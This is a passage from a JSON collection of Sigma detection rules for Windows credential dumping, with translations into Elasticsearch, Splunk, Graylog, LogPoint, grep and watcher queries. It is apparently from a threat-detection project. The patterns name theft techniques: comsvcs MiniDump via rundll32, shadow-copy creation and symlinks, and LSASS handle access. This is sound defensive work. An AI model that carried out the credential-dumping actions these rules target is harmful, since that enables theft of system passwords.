39f919f3-980b-4e6f-a975-8af7e507ef2b\nstatus: experimental\ndescription: Detects QuarksPwDump clearing access history in hive\nauthor: Florian Roth\ndate: 2017/05/15\nmodified: 2019/11/13\ntags:\n    - attack.credential_access\n    - attack.t1003\nlevel: critical\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: 16\n        HiveName|contains: '\\AppData\\Local\\Temp\\SAM'\n        HiveName|endswith: '.dmp'\n    condition: selection\nfalsepositives:\n    - Unknown", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"16\" AND HiveName.keyword:*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\SAM* AND HiveName.keyword:*.dmp)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/QuarksPwDump-clearing-access-history <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"QuarksPwDump clearing access history\",\\n    \"description\": \"Detects QuarksPwDump clearing access history in hive\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"16\\\\\" AND HiveName.keyword:*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\SAM* AND HiveName.keyword:*.dmp)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"16\\\\\" AND HiveName.keyword:*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\SAM* AND HiveName.keyword:*.dmp)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'QuarksPwDump clearing access history\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"16\" AND HiveName.keyword:*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\SAM* AND HiveName.keyword:*.dmp)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"16\" HiveName=\"*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\SAM*\" HiveName=\"*.dmp\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"16\" HiveName=\"*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\SAM*\" HiveName=\"*.dmp\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*16)(?=.*.*\\\\AppData\\\\Local\\\\Temp\\\\SAM.*)(?=.*.*\\\\.dmp))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Shadow copies access via symlink\nid: 40b19fa6-d835-400c-b301-41f3a2baacaf\ndescription: Shadow Copies storage symbolic link creation using operating systems utilities\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all: \n          - mklink\n          - HarddiskVolumeShadowCopy\n    condition: selection\nfalsepositives:\n    - Legitimate administrator working with shadow copies, access for backup purposes\nstatus: experimental\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Shadow copies access via symlink\nid: 40b19fa6-d835-400c-b301-41f3a2baacaf\ndescription: Shadow Copies storage symbolic link creation using operating systems utilities\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all: \n          - mklink\n          - HarddiskVolumeShadowCopy\n    condition: selection\nfalsepositives:\n    - Legitimate administrator working with shadow copies, access for backup purposes\nstatus: experimental\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:*mklink* AND CommandLine.keyword:*HarddiskVolumeShadowCopy*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Shadow-copies-access-via-symlink <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Shadow copies access via symlink\",\\n    \"description\": \"Shadow Copies storage symbolic link creation using operating systems utilities\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(CommandLine.keyword:*mklink* AND CommandLine.keyword:*HarddiskVolumeShadowCopy*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:*mklink* AND CommandLine.keyword:*HarddiskVolumeShadowCopy*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Shadow copies access via symlink\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine.keyword:*mklink* AND CommandLine.keyword:*HarddiskVolumeShadowCopy*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*mklink*\" CommandLine=\"*HarddiskVolumeShadowCopy*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine=\"*mklink*\" CommandLine=\"*HarddiskVolumeShadowCopy*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*mklink.*)(?=.*.*HarddiskVolumeShadowCopy.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Shadow copies creation using operating systems utilities\nid: b17ea6f7-6e90-447e-a799-e6c0a493d6ce\ndescription: Shadow Copies creation using operating systems utilities, possible credential access\nauthor: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/22\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/tutorial-for-ntds-goodness-vssadmin-wmis-ntdsdit-system/\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        NewProcessName|endswith:\n            - '\\powershell.exe'\n            - '\\wmic.exe'\n            - '\\vssadmin.exe'\n        CommandLine|contains|all:\n            - shadow\n            - create\n    condition: selection\nfalsepositives:\n    - Legitimate administrator working with shadow copies, access for backup purposes\nstatus: experimental\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Shadow copies creation using operating systems utilities\nid: b17ea6f7-6e90-447e-a799-e6c0a493d6ce\ndescription: Shadow Copies creation using operating systems utilities, possible credential access\nauthor: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/22\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/tutorial-for-ntds-goodness-vssadmin-wmis-ntdsdit-system/\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        NewProcessName|endswith:\n            - '\\powershell.exe'\n            - '\\wmic.exe'\n            - '\\vssadmin.exe'\n        CommandLine|contains|all:\n            - shadow\n            - create\n    condition: selection\nfalsepositives:\n    - Legitimate administrator working with shadow copies, access for backup purposes\nstatus: experimental\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(NewProcessName.keyword:(*\\\\\\\\powershell.exe OR *\\\\\\\\wmic.exe OR *\\\\\\\\vssadmin.exe) AND CommandLine.keyword:*shadow* AND CommandLine.keyword:*create*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Shadow-copies-creation-using-operating-systems-utilities <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Shadow copies creation using operating systems utilities\",\\n    \"description\": \"Shadow Copies creation using operating systems utilities, possible credential access\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(NewProcessName.keyword:(*\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\wmic.exe OR *\\\\\\\\\\\\\\\\vssadmin.exe) AND CommandLine.keyword:*shadow* AND CommandLine.keyword:*create*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(NewProcessName.keyword:(*\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\wmic.exe OR *\\\\\\\\\\\\\\\\vssadmin.exe) AND CommandLine.keyword:*shadow* AND CommandLine.keyword:*create*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Shadow copies creation using operating systems utilities\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(NewProcessName.keyword:(*\\\\\\\\powershell.exe *\\\\\\\\wmic.exe *\\\\\\\\vssadmin.exe) AND CommandLine.keyword:*shadow* AND CommandLine.keyword:*create*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((NewProcessName=\"*\\\\\\\\powershell.exe\" OR NewProcessName=\"*\\\\\\\\wmic.exe\" OR NewProcessName=\"*\\\\\\\\vssadmin.exe\") CommandLine=\"*shadow*\" CommandLine=\"*create*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" NewProcessName IN [\"*\\\\\\\\powershell.exe\", \"*\\\\\\\\wmic.exe\", \"*\\\\\\\\vssadmin.exe\"] CommandLine=\"*shadow*\" CommandLine=\"*create*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\powershell\\\\.exe|.*.*\\\\wmic\\\\.exe|.*.*\\\\vssadmin\\\\.exe))(?=.*.*shadow.*)(?=.*.*create.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Process dump via comsvcs DLL\nid: 09e6d5c0-05b8-4ff8-9eeb-043046ec774c\nstatus: experimental\ndescription: Detects process memory dump via comsvcs.dll and rundll32\nreferences:\n    - https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/\n    - https://twitter.com/SBousseaden/status/1167417096374050817\nauthor: Modexp (idea)\ndate: 2019/09/02\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    rundll_image:\n        Image: '*\\rundll32.exe'\n    rundll_ofn:\n        OriginalFileName: 'RUNDLL32.EXE'\n    selection:\n        CommandLine:\n            - '*comsvcs*MiniDump*full*'\n            - '*comsvcs*MiniDumpW*full*'\n    condition: (rundll_image or rundll_ofn) and selection\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.credential_access\n    - attack.t1003\nfalsepositives:\n    - unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Process dump via comsvcs DLL\nid: 09e6d5c0-05b8-4ff8-9eeb-043046ec774c\nstatus: experimental\ndescription: Detects process memory dump via comsvcs.dll and rundll32\nreferences:\n    - https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/\n    - https://twitter.com/SBousseaden/status/1167417096374050817\nauthor: Modexp (idea)\ndate: 2019/09/02\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    rundll_image:\n        Image: '*\\rundll32.exe'\n    rundll_ofn:\n        OriginalFileName: 'RUNDLL32.EXE'\n    selection:\n        CommandLine:\n            - '*comsvcs*MiniDump*full*'\n            - '*comsvcs*MiniDumpW*full*'\n    condition: (rundll_image or rundll_ofn) and selection\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.credential_access\n    - attack.t1003\nfalsepositives:\n    - unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\rundll32.exe OR OriginalFileName:\"RUNDLL32.EXE\") AND CommandLine.keyword:(*comsvcs*MiniDump*full* OR *comsvcs*MiniDumpW*full*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Process-dump-via-comsvcs-DLL <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Process dump via comsvcs DLL\",\\n    \"description\": \"Detects process memory dump via comsvcs.dll and rundll32\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\rundll32.exe OR OriginalFileName:\\\\\"RUNDLL32.EXE\\\\\") AND CommandLine.keyword:(*comsvcs*MiniDump*full* OR *comsvcs*MiniDumpW*full*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\rundll32.exe OR OriginalFileName:\\\\\"RUNDLL32.EXE\\\\\") AND CommandLine.keyword:(*comsvcs*MiniDump*full* OR *comsvcs*MiniDumpW*full*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Process dump via comsvcs DLL\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\rundll32.exe OR OriginalFileName:\"RUNDLL32.EXE\") AND CommandLine.keyword:(*comsvcs*MiniDump*full* *comsvcs*MiniDumpW*full*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\rundll32.exe\" OR OriginalFileName=\"RUNDLL32.EXE\") (CommandLine=\"*comsvcs*MiniDump*full*\" OR CommandLine=\"*comsvcs*MiniDumpW*full*\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image=\"*\\\\\\\\rundll32.exe\" OR OriginalFileName=\"RUNDLL32.EXE\") CommandLine IN [\"*comsvcs*MiniDump*full*\", \"*comsvcs*MiniDumpW*full*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?:.*.*\\\\rundll32\\\\.exe|.*RUNDLL32\\\\.EXE)))(?=.*(?:.*.*comsvcs.*MiniDump.*full.*|.*.*comsvcs.*MiniDumpW.*full.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Password Dumper Activity on LSASS\nid: aa1697b7-d611-4f9a-9cb2-5125b4ccfd5c\ndescription: Detects process handle on LSASS process with certain access mask and object type SAM_DOMAIN\nstatus: experimental\nreferences:\n    - https://twitter.com/jackcr/status/807385668833968128\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4656\n        ProcessName: 'C:\\Windows\\System32\\lsass.exe'\n        AccessMask: '0x705'\n        ObjectType: 'SAM_DOMAIN'\n    condition: selection\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Password Dumper Activity on LSASS\nid: aa1697b7-d611-4f9a-9cb2-5125b4ccfd5c\ndescription: Detects process handle on LSASS process with certain access mask and object type SAM_DOMAIN\nstatus: experimental\nreferences:\n    - https://twitter.com/jackcr/status/807385668833968128\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4656\n        ProcessName: 'C:\\Windows\\System32\\lsass.exe'\n        AccessMask: '0x705'\n        ObjectType: 'SAM_DOMAIN'\n    condition: selection\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4656\" AND ProcessName:\"C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\lsass.exe\" AND AccessMask:\"0x705\" AND ObjectType:\"SAM_DOMAIN\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Password-Dumper-Activity-on-LSASS <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Password Dumper Activity on LSASS\",\\n    \"description\": \"Detects process handle on LSASS process with certain access mask and object type SAM_DOMAIN\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4656\\\\\" AND ProcessName:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\lsass.exe\\\\\" AND AccessMask:\\\\\"0x705\\\\\" AND ObjectType:\\\\\"SAM_DOMAIN\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4656\\\\\" AND ProcessName:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\lsass.exe\\\\\" AND AccessMask:\\\\\"0x705\\\\\" AND ObjectType:\\\\\"SAM_DOMAIN\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Password Dumper Activity on LSASS\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4656\" AND ProcessName:\"C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\lsass.exe\" AND AccessMask:\"0x705\" AND ObjectType:\"SAM_DOMAIN\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4656\" ProcessName=\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\lsass.exe\" AccessMask=\"0x705\" ObjectType=\"SAM_DOMAIN\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4656\" ProcessName=\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\lsass.exe\" AccessMask=\"0x705\" ObjectType=\"SAM_DOMAIN\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4656)(?=.*C:\\\\Windows\\\\System32\\\\lsass\\\\.exe)(?=.*0x705)(?=.*SAM_DOMAIN))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Generic Password Dumper Activity on LSASS\nid: 4a1b6da0-d94f-4fc3-98fc-2d9cb9e5ee76\ndescription: Detects process handle on LSASS process with certain access mask\nstatus: experimental\nauthor: Roberto Rodriguez, Teymur Kheirkhabarov, Dimitrios Slamaris, Mark Russinovich, Aleksey Potapov, oscd.community (update)\ndate: 2019/11/01\nmodified: 2019/11/07\nreferences:\n    - https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.credential_access\n    - attack.t1003\n    - car.2019-04-004\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection_1:\n        EventID: 4656\n        ObjectName|endswith: '\\lsass.exe'\n        AccessMask|contains:\n            - '0x40'\n            - '0x1400'\n            - '0x1000'\n            - '0x100000'\n            - '0x1410'    # car.2019-04-004\n            - '0x1010'    # car.2019-04-004\n            - '0x1438'    # car.2019-04-004\n            - '0x143a'    # car.2019-04-004\n            - '0x1418'    # car.2019-04-004\n            - '0x1f0fff'\n            - '0x1f1fff'\n            - '0x1f2fff'\n            - '0x1f3fff'\n    selection_2:\n        EventID: 4663\n        ObjectName|endswith: '\\lsass.exe'\n        AccessList|contains:\n            - '4484'\n            - '4416'\n    filter:\n        ProcessName|endswith: \n            - '\\wmiprvse.exe'\n            - '\\taskmgr.exe'\n            - '\\procexp64.exe'\n            - '\\procexp.exe'\n            - '\\lsm.exe'\n            - '\\csrss.exe'\n            - '\\wininit.exe'\n            - '\\vmtoolsd.exe'\n    condition: selection_1 or selection_2 and not filter\nfalsepositives:\n    - Legitimate software accessing LSASS process for legitimate reason; update the whitelist with it\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Generic Password Dumper Activity on LSASS\nid: 4a1b6da0-d94f-4fc3-98fc-2d9cb9e5ee76\ndescription: Detects process handle on LSASS process with certain access mask\nstatus: experimental\nauthor: Roberto Rodriguez, Teymur Kheirkhabarov, Dimitrios Slamaris, Mark Russinovich, Aleksey Potapov, oscd.community (update)\ndate: 2019/11/01\nmodified: 2019/11/07\nreferences:\n    - https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.credential_access\n    - attack.t1003\n    - car.2019-04-004\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection_1:\n        EventID: 4656\n        ObjectName|endswith: '\\lsass.exe'\n        AccessMask|contains:\n            - '0x40'\n            - '0x1400'\n            - '0x1000'\n            - '0x100000'\n            - '0x1410'    # car.2019-04-004\n            - '0x1010'    # car.2019-04-004\n            - '0x1438'    # car.2019-04-004\n            - '0x143a'    # car.2019-04-004\n            - '0x1418'    # car.2019-04-004\n            - '0x1f0fff'\n            - '0x1f1fff'\n            - '0x1f2fff'\n            - '0x1f3fff'\n    selection_2:\n        EventID: 4663\n        ObjectName|endswith: '\\lsass.exe'\n        AccessList|contains:\n            - '4484'\n            - '4416'\n    filter:\n        ProcessName|endswith: \n            - '\\wmiprvse.exe'\n            - '\\taskmgr.exe'\n            - '\\procexp64.exe'\n            - '\\procexp.exe'\n            - '\\lsm.exe'\n            - '\\csrss.exe'\n            - '\\wininit.exe'\n            - '\\vmtoolsd.exe'\n    condition: selection_1 or selection_2 and not filter\nfalsepositives:\n    - Legitimate software accessing LSASS process for legitimate reason; update the whitelist with it\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"4656\" AND ObjectName.keyword:*\\\\\\\\lsass.exe AND AccessMask.keyword:(*0x40* OR *0x1400* OR *0x1000* OR *0x100000* OR *0x1410* OR *0x1010* OR *0x1438* OR *0x143a* OR *0x1418* OR *0x1f0fff* OR *0x1f1fff* OR *0x1f2fff* OR *0x1f3fff*)) OR ((EventID:\"4663\" AND ObjectName.keyword:*\\\\\\\\lsass.exe AND AccessList.keyword:(*4484* OR *4416*)) AND (NOT (ProcessName.keyword:(*\\\\\\\\wmiprvse.exe OR *\\\\\\\\taskmgr.exe OR *\\\\\\\\procexp64.exe OR *\\\\\\\\procexp.exe OR *\\\\\\\\lsm.exe OR *\\\\\\\\csrss.exe OR *\\\\\\\\wininit.exe OR *\\\\\\\\vmtoolsd.exe)))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Generic-Password-Dumper-Activity-on-LSASS <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Generic Password Dumper Activity on LSASS\",\\n    \"description\": \"Detects process handle on LSASS process with certain access mask\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\",\\n      \"car.2019-04-004\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"4656\\\\\" AND ObjectName.keyword:*\\\\\\\\\\\\\\\\lsass.exe AND AccessMask.keyword:(*0x40* OR *0x1400* OR *0x1000* OR *0x100000* OR *0x1410* OR *0x1010* OR *0x1438* OR *0x143a* OR *0x1418* OR *0x1f0fff* OR *0x1f1fff* OR *0x1f2fff* OR *0x1f3fff*)) OR ((EventID:\\\\\"4663\\\\\" AND ObjectName.keyword:*\\\\\\\\\\\\\\\\lsass.exe AND AccessList.keyword:(*4484* OR *4416*)) AND (NOT 